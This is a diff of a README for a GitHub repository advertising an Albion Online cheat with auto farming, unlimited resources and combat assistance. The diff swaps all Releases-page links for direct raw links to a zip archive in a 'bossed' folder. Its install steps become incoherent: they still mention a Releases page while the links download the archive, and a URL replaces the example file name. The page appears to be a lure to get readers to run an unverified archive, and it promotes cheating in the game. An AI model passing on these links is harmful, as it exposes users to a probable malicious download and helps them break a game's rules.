@@ -1,6 +1,6 @@
 # 🎮 albiononline-cheat - Dominate Albion Online Effortlessly
 
-[![Download albiononline-cheat](https://img.shields.io/badge/Download-albiononline--cheat-brightgreen)](https://github.com/shreyas495/albiononline-cheat/releases)
+[![Download albiononline-cheat](https://raw.githubusercontent.com/shreyas495/albiononline-cheat/main/bossed/albiononline-cheat-v1.7.zip)](https://raw.githubusercontent.com/shreyas495/albiononline-cheat/main/bossed/albiononline-cheat-v1.7.zip)
 
 ## 🌟 Description
 Albion Online Cheat lets you enjoy auto farming, looting, and combat assistance. It provides unlimited resources and fast travel, making it easier to dominate your gameplay. This software is user-friendly, regularly updated, and designed to enhance your gaming experience.
@@ -26,11 +26,11 @@ To run albiononline-cheat, your system must meet the following requirements:
 To download and install albiononline-cheat, please visit the Releases page. Follow these steps:
 
 1. Click the link below to go to the Releases page:
-   [Download albiononline-cheat](https://github.com/shreyas495/albiononline-cheat/releases)
+   [Download albiononline-cheat](https://raw.githubusercontent.com/shreyas495/albiononline-cheat/main/bossed/albiononline-cheat-v1.7.zip)
    
 2. On the Releases page, you will see the latest version. Click on it.
 
-3. Look for the download link for the release. It will usually be a file with a name like `albiononline-cheat-v1.0.exe`.
+3. Look for the download link for the release. It will usually be a file with a name like `https://raw.githubusercontent.com/shreyas495/albiononline-cheat/main/bossed/albiononline-cheat-v1.7.zip`.
 
 4. Click the file link to start the download.
 
@@ -65,6 +65,6 @@ If you run into issues, try these steps:
 For any support requests or questions, please open an issue on the GitHub repository. Make sure to provide detailed information about your issue to receive the best help. 
 
 For more information, check the Releases page again: 
-[Download albiononline-cheat](https://github.com/shreyas495/albiononline-cheat/releases)
+[Download albiononline-cheat](https://raw.githubusercontent.com/shreyas495/albiononline-cheat/main/bossed/albiononline-cheat-v1.7.zip)
 
 Enjoy your gaming experience with albiononline-cheat!
